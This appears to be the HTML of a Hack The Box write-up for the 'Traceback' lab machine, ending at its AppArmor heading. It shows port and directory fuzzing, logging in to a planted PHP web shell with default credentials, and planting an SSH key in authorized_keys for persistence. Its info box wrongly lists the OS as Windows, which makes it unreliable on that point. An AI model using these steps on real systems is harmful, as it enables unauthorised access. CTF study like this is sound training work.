@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta description="This is an easy Linux box.">
+    
+    <title>
+        
+            Traceback | mmezirard
+        
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Traceback<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-11-25</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/traceback/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#remote-enumeration">Remote enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#host-discovery">Host discovery</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#tcp-port-scanning">TCP port scanning</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#service-fingerprinting">Service fingerprinting</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#scripts">Scripts</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#apache-port-80-tcp">Apache (port 80&#x2F;tcp)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#source-code-review">Source code review</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#directory-fuzzing">Directory fuzzing</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#osint">OSINT</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#webshell-fuzzing">Webshell fuzzing</a>
+                                            </li>
+                                        
+                                    </ul>
+                            
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#foothold-webshell">Foothold (webshell)</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#osint-1">OSINT</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#ssh-port-22-tcp">SSH (port 22&#x2F;tcp)</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#local-enumeration">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#distribution">Distribution</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#architecture">Architecture</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#kernel">Kernel</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#apparmor">AppArmor</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#nics">NICs</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#hostname">Hostname</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#local-users">Local users</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#local-groups">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#home-folder">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#command-history">Command history</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#lateral-movement-luvit">Lateral movement (luvit)</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#local-enumeration-1">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#local-groups-1">Local groups</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#home-folder-1">Home folder</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#command-history-1">Command history</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#sudo-permissions">Sudo permissions</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#listening-ports">Listening ports</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#processes">Processes</a>
+                                </li>
+
+                                
+                        
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#motd-feature">MOTD feature</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#privilege-escalation-motd">Privilege escalation (MOTD)</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#local-enumeration-2">Local enumeration</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#home-folder-2">Home folder</a>
+                                </li>
+
+                                
+                        
+                    </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/traceback/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Windows</p>
+<p><strong>Release date</strong>: 2021-10-02</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/13531">MrR3boot</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with <code>sudo</code>, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box. I'll call it <code>workspace</code>, and it will be located at the root of my filesystem <code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll run <code>httpsimpleserver</code> to create an HTTP server and <code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.30</code>, while the target machine's IP address will be <code>10.10.10.181</code>. The commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="remote-enumeration">Remote enumeration</h1>
+<h2 id="host-discovery">Host discovery</h2>
+<p>Well, we already know the IP we are targeting, so this phase is actually empty!</p>
+<h2 id="tcp-port-scanning">TCP port scanning</h2>
+<p>As usual, I'll initiate a port scan on Traceback using a TCP SYN <code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.181<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="service-fingerprinting">Service fingerprinting</h2>
+<p>Following the port scan, let's gather more data about the services associated with the open ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.181<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span class="z-text z-plain">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h2 id="scripts">Scripts</h2>
+<p>Let's run <code>nmap</code>'s default scripts on these services to see if they can find additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> 10.10.10.181<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> 22,80<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+</span><span class="z-text z-plain">|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+</span><span class="z-text z-plain">|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Help us
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The output of these scripts is not really useful, we only learned that the default web page on the Apache server is titled <code>Help us</code>.</p>
+<p>Let's move on to the exploration of the web server, since we have no other option!</p>
+<h2 id="apache-port-80-tcp">Apache (port <code>80/tcp</code>)</h2>
+<p>If we browse to <code>http://10.10.10.181/</code>, we see this web page:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/traceback/apache-homepage.png" alt="Apache homepage" /></p>
+<p>Well... I certainly didn't expect that! So apparently, this website has been defaced by <code>Xh4H</code> (the creator of this box), and there's a backdoor somwhere? I guess that we're supposed to find it!</p>
+<h3 id="source-code-review">Source code review</h3>
+<p>The first thing we can do is to check if the source code of this web page contains anything that might leak the location of this mysterious backdoor.</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-block z-any z-html">center</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic">    <span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-block z-any z-html">h1</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>This site has been owned<span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;/</span><span class="z-entity z-name z-tag z-block z-any z-html">h1</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic">    <span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-block z-any z-html">h2</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>I have left a backdoor for all the net. FREE INTERNETZZZ<span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;/</span><span class="z-entity z-name z-tag z-block z-any z-html">h2</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic">    <span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span><span class="z-entity z-name z-tag z-block z-any z-html">h3</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span> - Xh4H - <span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;/</span><span class="z-entity z-name z-tag z-block z-any z-html">h3</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic">    <span class="z-comment z-block z-html"><span class="z-punctuation z-definition z-comment z-begin z-html">&lt;!--</span>Some of the best web shells that you might need ;)<span class="z-punctuation z-definition z-comment z-end z-html">--&gt;</span></span>
+</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-block z-any z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;/</span><span class="z-entity z-name z-tag z-block z-any z-html">center</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span><span class="z-text z-html z-basic"><span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">SNIP</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></code></pre>
+<p>There's indeed a comment, which indicates that the backdoor is a web shell, but it doesn't disclose the location of this web shell.</p>
+<h3 id="directory-fuzzing">Directory fuzzing</h3>
+<p>Let's see if we can find the web shell!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://10.10.10.181/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> .php</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 200, Size: 1113, Words: 109, Lines: 45, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.181/
+</span><span class="z-text z-plain">    * FUZZ: 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.181/.php
+</span><span class="z-text z-plain">    * FUZZ: .php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.181/server-status
+</span><span class="z-text z-plain">    * FUZZ: server-status
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so that's unsuccessful.</p>
+<h3 id="osint">OSINT</h3>
+<p>At this point, we could try to look for subdomains, but that would be pointless. <code>Xh4H</code> indicated that he left a backdoor 'for all the net', so it must be accessible from this domain. What if we search online for the comment we found in the HTML source code?</p>
+<p>The first result is <a href="https://github.com/TheBinitGhimire/Web-Shells">this GitHub page</a>! Its description is 'Some of the best web shells that you might need!', which is exactly the comment left by <code>Xh4H</code> on the HTML. That's probably not a coincidence!</p>
+<p>If we scroll down the README section, we see that there are several PHP web shells. <code>Xh4H</code> must have used one of them! Let's add their names to <code>/workspace/webshells</code>.</p>
+<pre class="z-code"><code><span class="z-text z-plain">alfav3-encoded.php
+</span><span class="z-text z-plain">alfav4.1-decoded.php
+</span><span class="z-text z-plain">alfav4.1-encoded.php
+</span><span class="z-text z-plain">andela.php
+</span><span class="z-text z-plain">bloodsecv4.php
+</span><span class="z-text z-plain">by.php
+</span><span class="z-text z-plain">c99ud.php
+</span><span class="z-text z-plain">cmd.php
+</span><span class="z-text z-plain">configkillerionkros.php
+</span><span class="z-text z-plain">mini.php
+</span><span class="z-text z-plain">obfuscated-punknopass.php
+</span><span class="z-text z-plain">punk-nopass.php
+</span><span class="z-text z-plain">punkholic.php
+</span><span class="z-text z-plain">r57.php
+</span><span class="z-text z-plain">smevk.php
+</span><span class="z-text z-plain">TwemlowsWebShell.php
+</span><span class="z-text z-plain">wso2.8.5.php
+</span></code></pre>
+<h3 id="webshell-fuzzing">Webshell fuzzing</h3>
+<p>Now, let's use <code>ffuf</code> to see if one of these files exist on the server!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> http://10.10.10.181/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /workspace/webshells</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">[Status: 200, Size: 1261, Words: 318, Lines: 59, Duration: 1520ms]
+</span><span class="z-text z-plain">| URL | http://10.10.10.181/smevk.php
+</span><span class="z-text z-plain">    * FUZZ: smevk.php
+</span></code></pre>
+<p>We got a hit!</p>
+<h1 id="foothold-webshell">Foothold (webshell)</h1>
+<p>Let's browse to <code>http://10.10.10.181/smevk.php</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/traceback/apache-web-shell-login.png" alt="Apache web shell login" /></p>
+<p>Unfortunately, we are asked for credentials... but <code>Xh4H</code> mentioned that this web shell was 'for all the net', so they must be easy to uncover.</p>
+<h2 id="osint-1">OSINT</h2>
+<p>According the the <a href="https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php">GitHub source</a>, the default credentials for <code>smevk.php</code> are <code>admin</code>:<code>admin</code>. Let's try them!</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/traceback/apache-web-shell-logged-in.png" alt="Apache web shell logged in" /></p>
+<p>It worked!</p>
+<h2 id="ssh-port-22-tcp">SSH (port <code>22/tcp</code>)</h2>
+<p>This web shell is pretty cool, but I prefer real shells. Thanks to our previous scans, we know that Traceback accepts connections over SSH.</p>
+<p>If we run <code>whoami</code>, we see that we are <code>webadmin</code>, and it turns out that this user has a folder in <code>/home</code>.</p>
+<p>The goal is now to add our own SSH key to <code>/home/webadmin/.ssh/authorized_keys</code> so that we can connect to Traceback using SSH. This way, we'll have a much more stable shell!</p>
+<p>First, I'll generate a SSH ed25519 key.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh-keygen<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>t</span> ed25519</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Generating public/private ed25519 key pair.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Your identification has been saved in /workspace/id_ed25519
+</span><span class="z-text z-plain">Your public key has been saved in /workspace/id_ed25519.pub
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Now, let's add the public key to Traceback by executing this command on the web shell console (replace the public key with your own):</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICF8Vs9QFJ3VTFx5hxO0vISYAK1MiJdi5VUkFPq5zpIT<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> /home/webadmin/.ssh/authorized_keys</span>
+</span></code></pre>
+<p>Now let's use our private key to connect as <code>webadmin</code> using SSH:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh webadmin@10.10.10.181<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> /workspace/id_ed25519</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">The authenticity of host &#39;10.10.10.181 (10.10.10.181)&#39; can&#39;t be established.
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class="z-text z-plain">Warning: Permanently added &#39;10.10.10.181&#39; (ED25519) to the list of known hosts.
+</span><span class="z-text z-plain">#################################
+</span><span class="z-text z-plain">-------- OWNED BY XH4H  ---------
+</span><span class="z-text z-plain">- I guess stuff could have been configured better ^^ -
+</span><span class="z-text z-plain">#################################
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Welcome to Xh4H land 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">webadmin@traceback:~$
+</span></code></pre>
+<p>Nice!</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>webadmin</code>.</p>
+<h2 id="distribution">Distribution</h2>
+<p>Let's see which distribution Traceback is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> lsb_release<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">No LSB modules are available.
+</span><span class="z-text z-plain">Distributor ID: Ubuntu
+</span><span class="z-text z-plain">Description:    Ubuntu 18.04.3 LTS
+</span><span class="z-text z-plain">Release:        18.04
+</span><span class="z-text z-plain">Codename:       bionic
+</span></code></pre>
+<p>So this is Ubuntu 18.04, okay. That's pretty recent, so we're unlikely to find vulnerabilities here.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is Traceback's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="kernel">Kernel</h2>
+<p>Maybe Traceback is vulnerable to a kernel exploit?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">webadmin@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4.15.0-58-generic
+</span></code></pre>
+<p>Unfortunately, the kernel version is recent too.</p>
+<h1 id="apparmor">AppArmor</h1>
+<p>Let's list the applications AppArmor profiles:</p>
